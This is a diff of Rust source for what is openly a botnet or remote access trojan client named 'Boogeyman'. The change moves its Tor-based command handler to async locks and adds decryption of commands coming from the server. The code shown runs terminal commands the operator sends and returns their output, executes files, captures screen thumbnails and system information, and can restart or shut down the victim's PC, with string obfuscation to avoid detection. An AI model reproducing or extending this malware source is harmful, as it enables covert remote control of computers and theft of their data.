@@ -1,9 +1,4 @@
-use std::{
-    os::windows::process::CommandExt,
-    path::PathBuf,
-    process::Command,
-    sync::{ Arc, Mutex, RwLock },
-};
+use std::{ os::windows::process::CommandExt, path::PathBuf, process::Command, sync::Arc };
 use anyhow::{ Context, Result };
 use client_vars::{
     constants::client_version,
@@ -14,10 +9,15 @@ use client_vars::{
     },
 };
 use shared::{
+    constants::communication_encryption_key,
     network::tor::{ LoggerCnfg, SrvRcvTp, TrHandler },
-    utils::functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
+    utils::{
+        encryption::{ convert_key_to_bytes, sauron_decrypt },
+        functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
+    },
 };
 use obfstr::obfstr as s;
+use tokio::sync::{ Mutex, RwLock };
 use crate::{
     err,
     info,
@@ -59,43 +59,59 @@ impl BotHandler {
         let self_clone = Arc::new(RwLock::new(self.clone()));
         let self_clone2 = self_clone.clone();
 
-        self.tor_handler.run(
-            move || {
-                Self::connect_callback_init(self_clone.clone());
-            },
-            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
+        self.tor_handler.run::<_, _, BotHandler>(
+            self_clone,
+            Self::receive_data,
+            Self::connect_callback_init
         ).await;
     }
+    fn receive_data(self_ref: Arc<RwLock<Self>>, raw_data: Vec<u8>) {
+        tokio::task::spawn(async move {
+            if
+                let Ok(decrypted_data) = sauron_decrypt(
+                    convert_key_to_bytes(&communication_encryption_key()),
+                    &raw_data
+                )
+            {
+                if let Err(_error) = Self::process_data(decrypted_data, self_ref).await {
+                    //? HONESTLY THIS ERROR VERY IMPORTANT WE SHOULD REPORT IT TO SERVER VIA DEFAULT ERROR type
+                    // ref_err!(
+                    //     self_clone.logger.lock().unwrap(),
+                    //     "Failed to process data via callback: ",
+                    //     error
+                    // );
+                };
+            }
+        });
+    }
     pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
-        info!("connect_callback_init");
+        tokio::task::spawn(async move {
+            info!("connect_callback_init");
 
-        let self_guard = self_ref.read().unwrap();
-        let params = InitParams { bot_state: self_guard.bot_state.read().unwrap().clone() };
-        if
-            let Err(_error) = Self::send_data(
-                &self_guard.tor_handler,
-                ServerAction::Init,
-                ServerParams::Init(params)
-            )
-        {
-            // err
-        }
+            let self_guard = self_ref.read().await;
+            let params = InitParams { bot_state: self_guard.bot_state.read().await.clone() };
+            drop(self_guard);
+            if
+                let Err(_error) = Self::send_data(
+                    self_ref.clone(),
+                    ServerAction::Init,
+                    ServerParams::Init(params)
+                ).await
+            {
+                // err
+            }
+        });
     }
 
-    fn process_data(
-        tor_handler: TrHandler,
-        binary_data: Vec<u8>,
-        self_ref: Arc<RwLock<Self>>
-    ) -> Result<()> {
+    async fn process_data(binary_data: Vec<u8>, self_ref: Arc<RwLock<Self>>) -> Result<()> {
         let processed_data: BoogeymanReceivePayload = serde_json
             ::from_slice(&binary_data)
             .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;
 
-        Self::route_data(tor_handler, processed_data, self_ref)
+        Self::route_data(processed_data, self_ref).await
     }
 
-    fn route_data(
-        tor_handler: TrHandler,
+    async fn route_data(
         processed_data: BoogeymanReceivePayload,
         self_ref: Arc<RwLock<Self>>
     ) -> Result<()> {
@@ -104,8 +120,8 @@ impl BotHandler {
             receive::ClientAction::UpdateSelf => {}
             receive::ClientAction::CallTerminalCommand => {
                 if let ClientParams::CallTerminalCommand(params) = processed_data.params {
-                    if let Some(terminal_ref) = &self_ref.read().unwrap().terminal {
-                        let mut terminal = terminal_ref.lock().unwrap();
+                    if let Some(terminal_ref) = &self_ref.read().await.terminal {
+                        let mut terminal = terminal_ref.lock().await;
 
                         let data = match terminal.execute(&params.command) {
                             Ok(data) =>
@@ -118,10 +134,10 @@ impl BotHandler {
                         };
                         drop(terminal);
                         Self::send_data(
-                            &tor_handler,
+                            self_ref.clone(),
                             ServerAction::TerminalOutput,
                             ServerParams::TerminalOutput(data)
-                        )?;
+                        ).await?;
                     } else {
                         return Err(anyhow::anyhow!(s!("Terminal not initialized").to_string()));
                     }
@@ -170,10 +186,10 @@ impl BotHandler {
                     let data = send::UpdateDynamicDataParams { dynamic_info: get_dynamic_info() };
 
                     Self::send_data(
-                        &tor_handler,
+                        self_ref,
                         ServerAction::UpdateDynamicData,
                         ServerParams::UpdateDynamicData(data)
-                    )?;
+                    ).await?;
                 } else {
                     return Err(
                         anyhow::anyhow!(
@@ -187,10 +203,10 @@ impl BotHandler {
                     let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };
 
                     Self::send_data(
-                        &tor_handler,
+                        self_ref,
                         ServerAction::UpdateThumbnail,
                         ServerParams::UpdateThumbnail(data)
-                    )?;
+                    ).await?;
                 } else {
                     return Err(
                         anyhow::anyhow!(
@@ -231,10 +247,10 @@ impl BotHandler {
                         };
 
                         Self::send_data(
-                            &tor_handler,
+                            self_ref,
                             ServerAction::ExecFileOutput,
                             ServerParams::ExecFileOutput(data)
-                        )?;
+                        ).await?;
                     } else {
                         program.spawn().context(s!("Failed to ExecFile").to_string())?;
                     }
@@ -300,13 +316,14 @@ impl BotHandler {
         }
         Ok(())
     }
-    fn send_data(
-        tor_handler: &TrHandler,
+    async fn send_data(
+        self_ref: Arc<RwLock<Self>>,
         action: ServerAction,
         params: ServerParams
     ) -> Result<()> {
+        let tor_h = &self_ref.read().await.tor_handler;
         let payload = BoogeymanSendPayload {
-            id: tor_handler.dv_id.read().unwrap().to_owned(),
+            id: tor_h.dv_id.read().await.to_owned(),
             version: client_version(),
             action,
             params,
@@ -316,6 +333,6 @@ impl BotHandler {
             ::to_vec(&payload)
             .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
 
-        tor_handler.add_to_send_queue(SrvRcvTp::Bgm, binary_data)
+        tor_h.add_to_send_queue(SrvRcvTp::Bgm, binary_data).await
     }
 }
